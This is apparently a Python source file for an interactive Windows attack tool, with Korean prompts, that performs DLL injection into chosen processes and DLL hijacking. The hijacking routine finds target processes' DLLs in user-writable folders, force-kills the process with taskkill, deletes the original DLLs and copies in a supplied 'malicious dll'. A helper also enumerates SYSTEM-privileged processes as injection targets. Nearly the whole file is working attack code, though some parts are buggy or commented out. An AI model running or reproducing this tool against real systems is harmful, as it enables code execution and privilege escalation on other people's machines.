import os
from tqdm import tqdm
from pyinjector import inject
import subprocess
import psutil
import shutil
class hiJacking():
    def hiJacking(self):
        pass
    def __init__(self):
        print("\n\nExecute DLL HiJacking mode------------------------------------------")
        input_op = input("\n입력할 옵션을 선택하시오.\n1. PID 입력하기    2. exe 경로 입력하기\n번호 입력:")
        print("\n")
        
        if input_op == '1':
            self.U_PID()
        elif input_op == '2':
            self.U_exe()
        else:
            print('ERROR::Wrong number..')
            ans = input('Do you want to try again? yes = \'y\', No =\'q\'\ninput: ')
            print('\n')
            if ans == 'y':
                self.__init__()
            else: 
                print("\n\n--End the program--\n")
                return
    
    def U_PID(self):
        del_pidlist = [0, 4, 120, 540, 748, 848, 860, 908, 916, 948,
                       988, 1196, 1256, 1420, 1424, 1436, 1456, 1468, 1548, 1628,
                       1740, 1748, 1812, 1820, 1828, 1924, 2000, 2072, 2096, 2172,
                       2204, 2220, 2284, 2368, 2424, 2448, 2512, 2584, 2608, 2616,
                       2832, 3012, 3024, 3160, 3180, 3232, 3472, 3568, 3656, 3708,
                       3724, 3744, 3828, 3888, 3972, 4116, 4364, 4372, 4424, 4464,
                       4712, 4788, 5088, 5424, 5444, 5804, 5888, 6440, 8224, 8248,
                       8344, 8484, 8620, 8724, 8744, 8852, 9272, 9312, 9612, 9820,
                       10228, 10236, 10408, 11228, 11540, 11852, 13152, 13712, 14300, 15280,
                       16536, 17396]
        print('<안내 - PID를 입력해주세요>')
        pid_in = input('pid 1개 입력 시 맨 앞에 \'o\', 2개 이상 입력 시 \'m\' 명령어를 입력해주세요.\n예시> 1개 -> o pid\n      2개 이상 -> m pid pid ...\n입력할 명령어:')
        pid_arr = pid_in.split(' ')
        self.pid = []
        del_index = []
        if pid_arr[0] == 'o':
            pid_arr.pop(0)
            self.pid.append(pid_arr[0])
            
        elif pid_arr[0] == 'm':
            pid_arr.pop(0)
            print('\n<안내 - 2개 이상의 PID를 입력받았습니다.>\n')
            print('<안내 - Windows의 기본 프로세스 PID를 필터링합니다.>')
            for i in range(0, len(pid_arr)):
                if int(pid_arr[i]) in del_pidlist:
                    print(f'WARNING::You cannot attack PID \'{pid_arr[i]}\'')
                    del_index.insert(0, i)
            for i in del_index:
                pid_arr.pop(i)
                    
            self.pid= pid_arr
                
                                
        else: 
            print('\nERROR::Wrong command..')
            ans = input('Do you want to try again? yes = \'y\', No =\'q\'\ninput: ')
            print('\n')
            if ans == 'y':
                self.__init__()
            else: 
                print("\n\n--End the program--\n")
                return 
                    
        
        print('\n<안내 - PID를 성공적으로 입력받았습니다.>')
        print("Attackable PID:", * self.pid)
        print("\n")
        self.attack()
    
    
    def U_exe(self):
        print('<안내 - exe 경로 입력 옵션을 선택해주세요>')
        exe_op = input('1. 경로 1개 입력\n2. 경로 2개 이상 입력 시\n입력할 명령어:')
        
        print(f'\n<안내 - {exe_op}개의 exe 경로 입력해주세요>')
        if exe_op == '1':
            exe_in = input("입력:")
            
        elif exe_op == '2':
            exe_in = input("\"경로1\" \"경로2\" 형태로 입력해주세요.\n입력:")
            exe_in = exe_in.split(' ')
      
        else: 
            print('\nERROR::Wrong number..')
            ans = input('Do you want to try again? yes = \'y\', No =\'q\'\ninput: ')
            if ans == 'y':
                self.U_exe()
            else: 
                print("\n\n--End the program--\n")
                return 

        print('\n<안내 - exe 경로를 성공적으로 입력받았습니다.>')
        self.attack()
    
    def U_dll(self):
        print("<안내 - 공격용 악성 dll 옵션을 입력해주세요>")
        dll_op = input('1. 직접 dll 입력하기\t2. 제공되는 dll 사용하기\n입력할 명령어:')
        if dll_op == '1':
            print('\n<안내 - \'직접 dll 입력하기\'를 선택하셨습니다.>')
            dll__in=input('사용하실 dll의 경로를 입력해주세요.\n입력할 경로:')
            
        elif dll_op == '2':
            print('\n<안내 - \'제공되는 dll 사용하기\'를 선택하셨습니다.>')
            dll__in = "C:/Users/codeb/Desktop/CreateDLL.dll"
               
        else: 
            print('\nERROR::Wrong number..')
            ans = input('Do you want to try again? yes = \'y\', No =\'q\'\ninput: ')
            if ans == 'y':
                self.U_dll()
            else: 
                print("\n\n--End the program--\n")
                return

        print('\n<안내 - dll 경로 설정을 완료했습니다.>\n')
        return dll__in
        
        
    #Listdlls.exe 파일을 이용하여 입력된 pid에서 로드하는 dll 목록을 가져옴
    def list_dll(self,pid):
        list_dll_path = os.getcwd() + "/" + "Listdlls.exe "
        stream = os.popen(list_dll_path + str(pid))
        
        dlls = stream.read()
        program_name = ""
        list_dlls = []
        list_programs = []
        path_lists = []

        try:
            split_text = dlls.replace("\\","/").replace('  ','\n').split('\n')
            
       
            for i in split_text:
                path_lists.append(i.replace(" ",""))
            
            for i in path_lists:
                if i.endswith(".exe"):
                    list_programs.append(i)
                if i.endswith(".dll"):
                    list_dlls.append(i)   
            for i in list_programs:
                if i.startswith("C:/"):
                    program_name = i
        except:
            print("Wrong pid...")
        return program_name, list_dlls
        
    
    #dll이 저장되어 있는 폴더의 일반 유저 또한 쓰기 권한이 있는지 검증
    def check_permission(self,path):
        user_perm_dir = []
        user_perm_file = []
        for i in path:
            dir_path = os.path.dirname(i)
            try:
                open(dir_path+"/test.txt","w")
                os.remove(dir_path+"/test.txt")
                name_split = i.split('/')
                name = name_split[-1]
                user_perm_file.append(name)
                user_perm_dir.append(i)
                # if os.access(dir_path,os.W_OK):
                #     name_split = i.split('/')
                #     name = name_split[-1]
                #     user_perm_file.append(name)
                #     user_perm_dir.append(i)
            except:
                pass
        return user_perm_file,user_perm_dir
    
    #strings 명령어를 이용하여 dll을 하드코딩으로 로드하는지 확인
    def find_string(self,name,list_name,list_dir):
        stream = os.popen("strings " + name)
        strings = stream.read()
        strings = strings.replace("\\",'/').split("\n")
        string_dll = []
        for i in strings:
            if i.endswith(".dll"):
                string_dll.append(i)
        for string in string_dll:
            if  string in list_name:
                return True
            elif string in list_dir:
                return True
            else:
                return False
            
    #exe파일을 직접 실행하여 pid를 가져옴
    def create_process(self,path):
            return subprocess.Popen([path]).pid
        
    #악성 dll을 입력받은 경로로 바꿔줌
    def change_dll(self,dll_path,hijactable_dll_path,pid):
        try:
            for i in hijactable_dll_path:
                os.remove(i)
                shutil.copy2(dll_path,i)
                
        except:
            print("\nERROR::Cannot remove or write DLL")
            
    def gen_txt(self, contents):
        f = open("새파일.txt", 'w')
        f.write(contents)
        f.close()
                
    # 사전 검사를 통해 dll Hijacking에 취약한지 확인하여 공격을 함
    # 다만 이것이 일관성(모든 경우에 해당하는) 탐지 및 공격 방법인지는 검증 필요
    def attack(self):
        # path_exe = "C:/Users/codeb/Desktop/ExamDLL/CreateDLL/x64/Debug/MainDLL.exe"
        # path_dll = "C:/Users/codeb/Desktop/CreateDLL.dll"
        # pid = self.create_process(path_exe)
        path_dll = self.U_dll()
        
        for i in range(0,len(self.pid)):
            print(f'{len(self.pid)}개의 pid 중 {i+1}번째 pid로의 hiJacking!')
            
            program_name, list_dlls = self.list_dll(int(self.pid[i]))
            file_list,dir_list = self.check_permission(list_dlls)
            
            if not len(file_list) == 0:
                if self.find_string(program_name,file_list,dir_list):
                    print("Detect programs vulnerable to dll injection")
                    print("Vulnerable PID : " + self.pid[i])
                    os.system('taskkill /f /pid '+self.pid[i])
                    self.change_dll(path_dll,dir_list,int(self.pid[i]))
                else:
                    print("Nah....")
            else:
                print("\nERROR::Not Found writable dir")
                ans = input('Do you want to try again? Back to the beginning DLL HiJacking\nYes = \'y\', No =\'q\'\ninput: ')
                if ans == 'y':
                    self.__init__()
                else: 
                    print("End the program")
                    return 

class injection():
    def injection(self):
        pass
    def in_PID(self):
        pid = input('pid 1개 입력 시 맨 앞에 \'o\', 2개 이상 입력 시 \'m\' 명령어를 입력해주세요.\n예시> 1개 -> o pid\n     2개 이상 -> m pid pid ...\n입력할 명령어:')
        pid_arr = pid.split(' ')
        if pid[0] == 'o':
            pid = pid_arr[1]
        else:
            pid = []
            for i in range(1, len(pid_arr)):
                pid.append(pid_arr[i])
                
        return pid
    #SYSTEM 권한으로 실행되는 프로세스 파싱, return 값 => pid
    def find_process(self):
        proc_lists = []
        try:
            # 실행중인 프로세스를 순차적으로 검색
            for proc in psutil.process_iter():
            # 프로세스 이름을 ps_name에 할당
                ps_name = proc.name()
                # 실행 명령어와 인자(argument)를 리스트 형식으로 가져와 cmdline에 할당
                cmdline = proc.cmdline()
                
                username = proc.username()
                if username.endswith('SYSTEM'):
                    proc_lists.append(proc.ppid())
                print('NAME:', ps_name, ' CMD:', cmdline, ' userName: ', username)
            return proc_lists
        except:
            pass
        
        
     
    #find_process에서 찾은 pid를 악성 dll을 이용하여 인젝션 해보기
    def attack(self,pid,path_dll):
        inject(pid,path_dll)

def cho_mod():
    att_mod = input('DLLInjection: \'DI\', DLLHiJacking: \'DH\'\nChoose attack mode: ')
    
    if (att_mod != 'DI') & (att_mod != 'DH'):
        print("\nERROR::Attack mode is wrong ..")
        ans = input('Do you want to try again? yes = \'y\', No =\'q\'\ninput: ')
        print('\n')
        if ans == 'y':
            return cho_mod()
        else: 
            print("\n\n--End the program--\n")
            return 'q'
    
    return att_mod
            
if __name__=='__main__': 
    
    print(" /$$$$$$$ ")
    print("| $$__  $$  ")
    print("| $$  \ $$ /$$   /$$ /$$$$$$$   /$$$$$$   /$$$$$$$")
    print("| $$  | $$| $$  | $$| $$__  $$ /$$__  $$ /$$_____/")
    print("| $$  | $$| $$  | $$| $$  \ $$| $$  \ $$|  $$$$$$ ")
    print("| $$  | $$| $$  | $$| $$  | $$| $$  | $$ \____  $$")
    print("| $$$$$$$/|  $$$$$$$| $$  | $$|  $$$$$$/ /$$$$$$$/")
    print("|_______/  \____  $$|__/  |__/ \______/ |_______/ ")
    print("           /$$  | $$ ")
    print("          |  $$$$$$/")
    print("           \______/")
    print("\n")    
    
    mode = cho_mod()
    
    if mode == 'DI':
        dll_inject = injection()
    elif mode == 'DH':
        dll_hijact_pid = hiJacking()
    else:
        exit()
        
        
    
        
        
        
        
    # Injection
    # pid = dll_inject.in_PID()
    
    # HiJacking
    
    path_exe = "C:/Users/codeb/Desktop/ExamDLL/CreateDLL/x64/Debug/MainDLL.exe"
    path_dll = "C:/Users/codeb/Desktop/CreateDLL.dll"
    #pid = dll_hijact.create_process(path_exe)
    #inject(pid,path_dll)
    #dll_hijact.attack()